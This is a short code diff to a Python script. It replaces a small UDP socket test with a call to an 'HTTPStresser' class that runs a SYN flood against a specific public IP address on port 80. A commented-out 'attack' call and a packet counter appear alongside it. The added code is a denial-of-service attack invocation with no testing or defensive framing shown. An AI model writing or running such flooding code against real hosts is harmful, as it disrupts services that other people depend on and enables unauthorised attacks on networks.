@@ -1,9 +1,7 @@
-from Socket import Socket
-import logging
+from HTTPStresser import HTTPStresser
 
-
-logging.basicConfig(level=logging.DEBUG)
-logging.info('eyo')
-s = Socket('udp')
-s._connect('192.168.1.10', 1111)
-s._send(data='salut')
+stress = HTTPStresser(30, 10 , 'GET')
+stress.syn_flooder('3.143.242.217', 80)
+#stress.attack('3.143.242.217', 80)
+#print(stress.get_ip())
+print(stress.packet_sent)
